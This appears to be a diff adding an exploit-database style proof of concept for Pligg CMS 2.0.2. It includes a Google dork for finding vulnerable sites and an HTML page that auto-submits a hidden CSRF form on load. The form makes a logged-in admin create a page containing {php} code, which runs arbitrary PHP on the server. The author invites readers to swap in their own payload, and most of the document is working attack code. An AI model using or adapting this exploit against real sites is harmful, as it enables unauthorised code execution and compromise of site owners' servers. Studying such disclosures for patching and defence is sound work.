@@ -1,0 +1,56 @@
+<!--
+# Exploit Title: Pligg CMS Arbitrary Code Execution
+# Google Dork: intext:"Made wtih Pligg CMS"
+# Date: 2015/8/20
+# Exploit Author: Arash Khazaei
+# Vendor Homepage: http://pligg.com
+# Software Link:
+https://github.com/Pligg/pligg-cms/releases/download/2.0.2/2.0.2.zip
+# Version: 2.0.2
+# Tested on: Kali , Iceweasel Browser
+# CVE : N/A
+# Contact : http://twitter.com/0xClay
+# Mail : 0xclay@gmail.com
+# Site : http://bhunter.ir
+
+# Description :
+
+# Pligg CMS Is A CMS Writed In PHP Language And Licensed Under GPL V 2.0
+# In Pligg CMS Panel In Adding Page Section Pligg CMS Allow To Admin Add
+PHP Codes In {php} {/php} Tags
+# A CSRF Vulnerabilty In Adding Page Section Allow To Attacker To Execute
+PHP Codes On Server .
+# In This Exploit I Just Added a echo '<h1> Hacked </h1>'; Code You Can
+Customize Exploit For Your Self .
+
+# Exploit :
+-->
+
+<html>
+<body onload="document.exploit.submit();">
+<form action="http://localhost/pligg-cms/admin/submit_page.php"
+method="POST" id="thisform" name="exploit">
+<input type="hidden" name="page_title" id="page_title"
+size="66"value="Hacked"/>
+<input type="hidden" name="page_url" id="page_url" size="66"
+value="Hacked"/>
+<input type="hidden" name="page_keywords" id="page_keywords" size="66"
+value="Hacked"/>
+<input type="hidden" name="page_description" id="page_description"
+size="66" value="Hacked"/>
+<textarea type="hidden"id="textarea-1" name="page_content"
+class="form-control page_content" rows="15"> {php}echo '<h1> Hacked </h1>';
+{/php} &lt;/textarea&gt;
+<input type="hidden" name="process" value="new_page" />
+<input type="hidden" name="randkey" value="12412532" />
+</form>
+</body>
+</html>
+
+<!--
+# After HTML File Executed You Can Access Page In
+http://localhost/pligg-cms/page.php?page=Hacked
+
+
+# Discovered By Arash Khazaei . (Aka JunkyBoy (Nick Name Changed :P ))
+-->
